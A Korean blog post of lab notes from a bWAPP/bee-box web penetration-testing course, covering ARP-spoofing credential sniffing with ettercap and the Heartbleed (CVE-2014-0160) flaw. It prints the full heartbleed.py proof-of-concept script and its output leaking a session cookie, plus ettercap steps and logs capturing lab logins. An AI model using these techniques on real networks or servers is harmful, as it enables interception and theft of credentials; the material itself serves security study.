---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - HTTP 페이지내 평문데이터(ARP Spooing)/하트블리드 취약점"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part6 A6
  - 민감 데이터 노출
---

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 19강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

<!--more-->

## ARP Spoofing

* 근거리 통신망(LAN)에서 주소 결정 프로토콜(ARP) 메시지를 이용하여 상대방의 데이터 패킷을 중간에서 가로채는 중간자 공격 기법
* 클라이언트와 서버가 평문으로 통신한다면 중간에서 패킷을 가로채 내용을 확인할 수 있음

![image](https://user-images.githubusercontent.com/28076542/52789047-2d0c5c80-30a6-11e9-9235-079bb4703038.png)

---

## Clear Text HTTP (Credentials)

![image](https://user-images.githubusercontent.com/28076542/52789432-26cab000-30a7-11e9-8d18-008ff536462f.png)

* 서버는 비박스, 클라이언트는 윈도우 크롬, 공격자는 칼리리눅스

### 칼리리눅스 ettercap 실행

```bash
root@ming:~# ettercap -G
```

* File --> Unified sniffing --> eth0
* Hosts --> Scan for hosts
* Hosts --> Host List

### Hosts List

![image](https://user-images.githubusercontent.com/28076542/52789600-a0fb3480-30a7-11e9-9b13-12bed5f0c204.png)

* 맨 위 크롬을 Add to Target1
* 세 번째 Bee-Box를 Add to Target 2
* Mitm --> ARP Poisoning --> Sniff remote connections
* View --> Connections
* 이제 크롬에서 로그인 후 **Clear Text HTTP**에서도 로그인 후 Ettercap Log 확인

### Ettercap Log

```bash
Listening on:
  eth0 -> 00:0C:29:1D:54:6C
	  192.168.190.155/255.255.255.0
	  fe80::20c:29ff:fe1d:546c/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/eth0/use_tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...

  33 plugins
  42 protocol dissectors
  57 ports monitored
20388 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!
Starting Unified sniffing...

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
4 hosts added to the hosts list...
Host 192.168.190.1 added to TARGET1
Host 192.168.190.143 added to TARGET2

ARP poisoning victims:

 GROUP 1 : 192.168.190.1 00:50:56:C0:00:08

 GROUP 2 : 192.168.190.143 00:0C:29:7B:42:F7
HTTP : 192.168.190.143:80 -> USER: bee  PASS: bug  INFO: http://192.168.190.143/bWAPP/login.php
CONTENT: login=bee&password=bug&security_level=0&form=submit

HTTP : 192.168.190.143:80 -> USER: bee  PASS: bug  INFO: http://192.168.190.143/bWAPP/insuff_transp_layer_protect_1.php
CONTENT: login=bee&password=bug&form=submit
```

---

## Clear Text HTTP (Credentials) (High)

* Low와 달리 HTTPS를 사용함(443 포트)
* 똑같이 로그인하면 내용이 보이지 않음
* **SSL Strip**을 이용하면 뚫을 수 있으니 참고

---

## 하트블리드(HeartBleed)

![image](https://user-images.githubusercontent.com/28076542/52790382-bbcea880-30a9-11e9-92ad-dde61e37eff0.png)

* OpenSSL의 소프트웨어 버그(CVE 2014-0160)
* OpenSSL의 세션 연결을 확인하는 하트비트 기능의 버퍼오버플로우 취약점을 이용

### 파이어폭스 설정

* Preferences --> Advanced --> Network --> Settings... --> Use this proxy server for all protocols 체크

---

## Heartbleed Vulnerability

![image](https://user-images.githubusercontent.com/28076542/52790655-6e9f0680-30aa-11e9-8d92-e021ec13bd8b.png)

* attack script...를 눌러 스크립트 다운로드
* 8443포트가 취약하다고 했으니 URL: `https://192.168.190.143:8443/`로 접속

### heartbleed.py

```python
#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code
# Minor customizations by Malik Mesellem (@MME_IT)

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=8443, help='TCP port to test (default: 8443)')

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print 'No heartbeat response received, server likely not vulnerable'
            return False

        if typ == 24:
            print 'Received heartbeat response:'
            hexdump(pay)
            if len(pay) > 3:
                print 'WARNING: server returned more data than it should - server is vulnerable!'
            else:
                print 'Server processed malformed heartbeat, but did not return any extra data.'
            return True

        if typ == 21:
            print 'Received alert:'
            hexdump(pay)
            print 'Server returned error, likely not vulnerable'
            return False

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print 'Connecting...'
    sys.stdout.flush()
    s.connect((args[0], opts.port))
    print 'Sending Client Hello...'
    sys.stdout.flush()
    s.send(hello)
    print 'Waiting for Server Hello...'
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print 'Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    print 'Sending heartbeat request...'
    sys.stdout.flush()
    s.send(hb)
    hit_hb(s)

if __name__ == '__main__':
    main()
```

* [코드 분석 참고 사이트](https://jmoon.co.kr/164)

---

### heartbleed.py  실행

```bash
root@ming:~/바탕화면# python heartbleed.py -p 8443 192.168.190.143
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 675
 ... received message: type = 22, ver = 0302, length = 203
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 74 69 6F 6E  ....#.......tion
  00e0: 2F 66 6F 6E 74 2D 77 6F 66 66 3B 71 3D 30 2E 39  /font-woff;q=0.9
  00f0: 2C 2A 2F 2A 3B 71 3D 30 2E 38 0D 0A 41 63 63 65  ,*/*;q=0.8..Acce
  0100: 70 74 2D 4C 61 6E 67 75 61 67 65 3A 20 65 6E 2D  pt-Language: en-
  0110: 55 53 2C 65 6E 3B 71 3D 30 2E 35 0D 0A 41 63 63  US,en;q=0.5..Acc
  0120: 65 70 74 2D 45 6E 63 6F 64 69 6E 67 3A 20 67 7A  ept-Encoding: gz
  0130: 69 70 2C 20 64 65 66 6C 61 74 65 0D 0A 52 65 66  ip, deflate..Ref
  0140: 65 72 65 72 3A 20 68 74 74 70 73 3A 2F 2F 31 39  erer: https://19
  0150: 32 2E 31 36 38 2E 31 39 30 2E 31 34 33 3A 38 34  2.168.190.143:84
  0160: 34 33 2F 62 57 41 50 50 2F 73 74 79 6C 65 73 68  43/bWAPP/stylesh
  0170: 65 65 74 73 2F 73 74 79 6C 65 73 68 65 65 74 2E  eets/stylesheet.
  0180: 63 73 73 0D 0A 43 6F 6F 6B 69 65 3A 20 73 65 63  css..Cookie: sec
  0190: 75 72 69 74 79 5F 6C 65 76 65 6C 3D 30 3B 20 50  urity_level=0; P
  01a0: 48 50 53 45 53 53 49 44 3D 36 61 39 65 34 36 65  HPSESSID=6a9e46e
  01b0: 65 61 33 38 35 33 30 30 38 66 39 35 34 35 36 65  ea3853008f95456e
  01c0: 35 34 38 35 34 62 32 66 39 0D 0A 43 6F 6E 6E 65  54854b2f9..Conne
  01d0: 63 74 69 6F 6E 3A 20 63 6C 6F 73 65 0D 0A 0D 0A  ction: close....
  01e0: 1D 9A 5F 82 01 B6 D8 4A 66 C4 4D F5 05 45 B5 1B  .._....Jf.M..E..
  01f0: B1 F2 48 CF 97 E1 71 81 0E F7 D7 5B 37 06 0E AD  ..H...q....[7...
  0200: C6 AA 71 A9 34 EE AE 23 6D 74 D7 66 A0 4E 68 8F  ..q.4..#mt.f.Nh.
  0210: 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F  ................

WARNING: server returned more data than it should - server is vulnerable!
```

### BurpSuite의 HeartBleed 플러그인 사용

![image](https://user-images.githubusercontent.com/28076542/52791274-e6b9fc00-30ab-11e9-914b-fc3b1dc94eef.png)

* Extender --> BApp Store --> HeartBleed --> Install로 설치 후
* Target --> Site map --> 8443 포트 사이트 우클릭 --> Heartbleed this! --> Port: 8443

### HeartBleed 진행 화면

![image](https://user-images.githubusercontent.com/28076542/52791828-3c42d880-30ad-11e9-90e3-e8e1daecaae2.png)

* 여기서 더 이상 진행 안 되고 이런게 있다는 것만 알아두기 ㅠ_ㅠ